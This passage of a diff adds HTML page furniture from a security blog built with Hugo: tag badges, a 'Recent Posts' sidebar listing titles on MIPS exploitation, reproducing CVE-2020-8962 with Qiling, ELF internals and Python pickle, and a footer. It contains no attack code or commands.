+        <a href="/tags/cve/">
+            <span class="layui-badge " style="vertical-align: 2px;">CVE</span>
+        </a>
+    
+        <a href="/tags/python/">
+            <span class="layui-badge " style="vertical-align: 2px;">Python</span>
+        </a>
+    
+    
+</h3>
+                        </blockquote>
+                    </div>
+                	
+                
+                <br />
+            </div>
+            
+
+            <div class="layui-card single-card">
+                <h2 class="single-title">Recent Posts</h2>
+            
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/breakdown_mips_binary_exploit_with_qdb/">
+                        <h3 class="">Breakdown MIPS binary exploit with Qdb</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2021-02-01</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/qiling/">
+            <span class="layui-badge " style="vertical-align: 2px;">Qiling</span>
+        </a>
+    
+        <a href="/tags/qdb/">
+            <span class="layui-badge " style="vertical-align: 2px;">Qdb</span>
+        </a>
+    
+        <a href="/tags/iot/">
+            <span class="layui-badge " style="vertical-align: 2px;">IoT</span>
+        </a>
+    
+    
+</h3>
+                    </blockquote>
+                </div>
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/cve_2020_8962/">
+                        <h3 class="">How to reproduce CVE-2020-8962 with Qiling Framework</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2020-07-30</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/qiling/">
+            <span class="layui-badge " style="vertical-align: 2px;">Qiling</span>
+        </a>
+    
+        <a href="/tags/cve/">
+            <span class="layui-badge " style="vertical-align: 2px;">CVE</span>
+        </a>
+    
+        <a href="/tags/d-link/">
+            <span class="layui-badge " style="vertical-align: 2px;">D-Link</span>
+        </a>
+    
+    
+</h3>
+                    </blockquote>
+                </div>
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/elf_symbol_resolving/">
+                        <h3 class="">ELF Symbol Resolving</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2019-12-12</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/elf/">
+            <span class="layui-badge " style="vertical-align: 2px;">ELF</span>
+        </a>
+    
+    
+</h3>
+                    </blockquote>
+                </div>
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/python_pickle/">
+                        <h3 class="">Python Pickle</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2019-05-30</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/python/">
+            <span class="layui-badge " style="vertical-align: 2px;">Python</span>
+        </a>
+    
+        <a href="/tags/pickle/">
+            <span class="layui-badge " style="vertical-align: 2px;">Pickle</span>
+        </a>
+    
+    
+</h3>
+                    </blockquote>
+                </div>
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/lazy_binding_in_elf/">
+                        <h3 class="">Lazy binding in ELF</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2019-05-15</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/elf/">
+            <span class="layui-badge " style="vertical-align: 2px;">ELF</span>
+        </a>
+    
+    
+</h3>
+                    </blockquote>
+                </div>
+                
+            
+            <br />
+            </div>
+        </div>
+
+    </div>
+</div>
+
+
+        </div><footer>
+    
+    
+    <div class="layui-container">
+        <p class="copyright">&copy; All rights reserved. Powered by <a href='https://gohugo.io' style='color:#FFFFFF'>Hugo</a> and <a href='https://github.com/ertuil/erblog' style='color:#FFFFFF'>Erblog</a>.</p>
+    </div>
+</footer>
+</body>
+</html>
